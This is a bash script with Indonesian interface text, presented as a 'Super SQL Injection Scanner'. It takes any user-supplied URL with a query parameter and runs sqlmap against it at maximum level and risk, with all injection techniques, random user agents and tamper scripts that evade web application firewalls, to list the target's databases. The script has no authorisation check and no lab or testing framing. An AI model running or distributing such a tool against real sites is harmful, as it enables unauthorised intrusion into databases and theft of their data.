#!/bin/bash

# Warna
red='\e[91m'
green='\e[92m'
yellow='\e[93m'
cyan='\e[96m'
reset='\e[0m'

# Tampilan
clear
echo -e "${cyan}  >>> SUPER SQL INJECTION SCANNER <<<${reset}"
echo ""

# Fungsi loading
loading_bar() {
    bar=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
    for i in {1..35}; do
        echo -ne "\r${yellow}[*] Bentar Scan Dulu ${bar:0:$i}${reset}"
        sleep 0.05
    done
    echo -e "\n"
}

# Input target URL
read -p "$(echo -e ${green}"-->> [ LINK WEB ] : "${reset})" target

# Validasi URL
if [[ ! "$target" =~ \?.*=.* ]]; then
    echo -e "${red}[!] ERROR: PARAMETER TIDAK ADA ATAU INVALID (index.php?id=1)${reset}"
    exit 1
fi

# Menentukan protokol SSL (jika target menggunakan HTTPS)
if [[ "$target" =~ ^https:// ]]; then
    ssl_option="--force-ssl"
else
    ssl_option=""
fi

# Jenis Scan
scan_option="--dbs"

# Scan mulai
echo -e "${green}>> SCAN DI GASIN <<${reset}"
loading_bar

# Eksekusi SQLMAP
sqlmap -u "$target" --batch $scan_option --level=5 --risk=3 --threads=10 --random-agent \
$ssl_option --ignore-redirects \
--tamper=between,randomcase,space2comment \
--technique=BEUSTQ --batch --timeout=30

# Sukses
echo -e "${green}[✔] Scan Selesai, Hasilnya Sudah Tersedia.${reset}"
